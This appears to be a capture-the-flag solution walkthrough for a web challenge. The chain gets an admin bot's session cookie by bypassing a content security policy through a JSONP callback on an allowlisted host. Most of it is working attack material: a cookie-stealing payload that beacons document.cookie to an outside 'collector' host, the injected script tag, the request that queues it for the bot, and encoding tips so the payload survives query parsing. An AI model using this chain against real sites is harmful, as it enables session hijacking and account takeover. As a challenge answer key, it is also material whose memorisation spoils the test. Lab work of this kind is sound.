Full chain. The payload you want the admin's browser to run is:

```js
new Image().src = 'http://collector:9000/report?c=' + encodeURIComponent(document.cookie);
```

Put it in the JSONP callback of a script whose src is the allowlisted host:

```html
<script src="http://accounts-trusted:8080/api/jsonp?callback=new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)//"></script>
```

Queue that as the `q` value for the admin bot to visit:

```
POST /report
Content-Type: application/json

{"url":"/?q=<the injection above, URL-encoded>"}
```

**Encoding caveat (this bites everyone):** the callback passes through the JSONP
host's query parser, and a **literal `+` in a query string decodes to a space** —
which turns `'…'+encodeURIComponent` into `'…' encodeURIComponent`, a syntax
error. Percent-encode the callback fully so the `+` operator travels as `%2B`.
(`tests/exploit.py` uses `urllib.parse.quote(callback, safe="")`, then encodes the
whole `q` again.)

Wait ~2s for the bot to load the path. The allowlisted `<script src>` loads, the
JSONP echoes your JS, it runs in the app origin and beacons the cookie. Read it:

```
GET /oob/received        # item path like /report?c=session%3D<32 hex>
```

Submit the 32-hex session:

```
POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

and you get `FLAG{…}`. `tests/exploit.py` runs the whole flow and also checks the
CSP `script-src` has no `'unsafe-inline'` — proving the gadget, not a weak CSP, is
what let you in.
